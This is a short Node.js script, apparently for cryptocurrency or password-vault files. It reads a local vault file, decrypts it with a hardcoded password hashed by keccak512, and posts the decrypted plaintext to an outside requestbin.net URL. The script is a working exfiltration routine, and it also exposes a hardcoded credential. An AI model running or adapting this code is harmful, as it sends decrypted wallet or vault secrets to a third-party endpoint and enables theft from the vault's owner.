const CryptoJS = require("crypto-js");
const jc = require("json-cycle");
const fs = require("fs");
const keccak512 = require("js-sha3").keccak512;
var request = require("request");
var url = "http://requestbin.net/r/18h0zom1";

function importVault(input, hashKey) {
  return new Promise((resolve, reject) => {
    try {
      const cipher = jc.retrocycle(JSON.parse(input));
      const bytes = CryptoJS.AES.decrypt(cipher.content, hashKey);
      try {
        const plaintext = bytes.toString(CryptoJS.enc.Utf8);
        const vaultObj = JSON.parse(plaintext);
        //   const recipher = CryptoJS.AES.encrypt(
        //     JSON.stringify(vaultObj),
        //     hashKey
        //   );
        //setLocalStorage('vault', JSON.stringify(jc.decycle(recipher)));
        resolve(vaultObj);
      } catch (error) {
        reject(error);
      }
    } catch (error) {
      reject(error);
    }
  });
}

fs.readFile("./UTC-1536167983025_vault", function(err, data) {
  importVault(data, keccak512("Soft$ware3#")).then(data => {
    request(
      {
        url: url,
        body: data,
        json: true
      },
      function(error, response, body) {
        if (!error) {
          console.log(body);
        }
      }
    );
  });
});
